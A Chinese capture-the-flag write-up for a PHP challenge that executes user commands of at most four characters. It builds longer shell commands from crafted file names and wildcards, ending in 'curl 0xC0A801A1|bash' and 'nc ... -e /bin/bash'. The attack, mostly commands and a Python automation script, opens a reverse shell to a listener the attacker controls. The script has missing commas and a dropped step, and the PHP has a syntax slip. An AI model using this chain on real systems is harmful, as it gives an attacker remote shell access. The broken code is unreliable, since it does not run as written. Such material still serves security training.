## 题目

```php
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);

function filter($argv){
 $a = str_replace("/*|\?|/","====",$argv);
 return $a;
}

if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4){
 exec(filter($_GET['cmd']));
} else {
 echo "flag in local path flag file!"
}
```

## 准备工作
---

1. 开启监听端口：`nc -lvp 7777`
2. 创建 index.html 文件：`echo "nc 192.168.1.161 7777 -e /bin/bash" > index.html`
3. 开启 HTTP 服务监听 80 端口：`python -m http.server 80`


## 法一：手动构造
---

### 步骤一：构造 `ls -t>g` 并写入`文件x`

```shell
┌──(root㉿zigyr)-[~/test]
└─# >g\;                   # 用";"阻断后面字符的影响

┌──(root㉿zigyr)-[~/test]
└─# >g\>

┌──(root㉿zigyr)-[~/test]
└─# >ht-                   # 之所以使`>ht-`，而非`>t-`，是为了使其在字典序排列中靠前

┌──(root㉿zigyr)-[~/test]
└─# >sl

┌──(root㉿zigyr)-[~/test]
└─# >dir

┌──(root㉿zigyr)-[~/test]
└─# *>v 

┌──(root㉿zigyr)-[~/test]
└─# >rev

------
┌──(root㉿zigyr)-[~/test]
└─# ls
 dir 'g;' 'g>' ht- rev sl v
------

┌──(root㉿zigyr)-[~/test]
└─# *v>x                   # 这一步可谓神来之笔, `*v>x`匹配并执行`rev v>x`

------
┌──(root㉿zigyr)-[~/test]
└─# cat x
ls -th >g ;g
------
```

### 步骤二：构造反弹shell `curl 0xC0A801A1|bash`

将 IP 地址转换为十六进制`192.168.1.161` → `0xC0A801A1`

curl 会自动解析十六进制的IP地址

```shell
>ash
>b\
>\|\
>A1\
>01\
>A8\
>C0\
>0x\
>\ \
>rl\
>cu\
```

### 步骤三：触发反弹shell

`sh x`  即执行`ls -th >g ;g`，按照文件名的时间排序，构造反弹shell并写入文件g
`sh g`  即执行`curl 0xC0A801A1|bash`,拿到反弹shell


## 法二：使用脚本
---

```python
import requests
import time

baseurl = "http://192.168.1.161:19080/class09/4/ffff.php?cmd="
s = requests.session()

list = [
 '>g\;', 
 '>g>' , 
 '>ht-', 
 '>sl',
 '>dir',
 '*>v',
 '>rev',
 '*v>x'
]

list2 = [
 '>ash'

 '>|\\'
 '>A1\\'
 '>01\\'
 '>A8\\'
 '>C0\\'
 '>0x\\'
 '> \\'
 '>rl\\'
 '>cu\\' 
]

for i in list:
 time.sleep(1)
 url = baseurl + str(i)
 s.get(url)
 
for i in list2:
 time.sleep(1)
 url = baseurl + str(i)
 s.get(url)
 
s.get(baseurl + "sh x")
s.get(baseurl + "sh g")
```

## Q&A

### Q：`*v>x` 中的通配符匹配规则是什么？

A：`*v` 匹配以 v 结尾的文件名。在当前目录下，按时间排序后为 `rev v`，执行 `rev v>x` 将结果输出到 x 文件。
